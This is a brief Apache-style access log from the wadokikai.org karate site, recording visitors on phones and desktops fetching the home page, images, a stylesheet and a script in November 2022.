::ffff:108.202.243.61 - - [22/Nov/2022:04:52:58 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:203.10.99.204 - - [22/Nov/2022:04:53:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:108.202.243.61 - - [22/Nov/2022:04:53:32 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:53:36 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:55:24 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:73.93.239.132 - - [22/Nov/2022:05:00:58 +0000] "GET / HTTP/1.1" 200 57378 "https://lm.facebook.com/" "Mozilla/5.0 (Linux; Android 13; SM-S908U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]"
::ffff:73.93.239.132 - - [22/Nov/2022:05:00:58 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 13; SM-S908U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]"
::ffff:73.93.239.132 - - [22/Nov/2022:05:00:58 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 13; SM-S908U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]"
::ffff:73.93.239.132 - - [22/Nov/2022:05:00:58 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 13; SM-S908U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]"
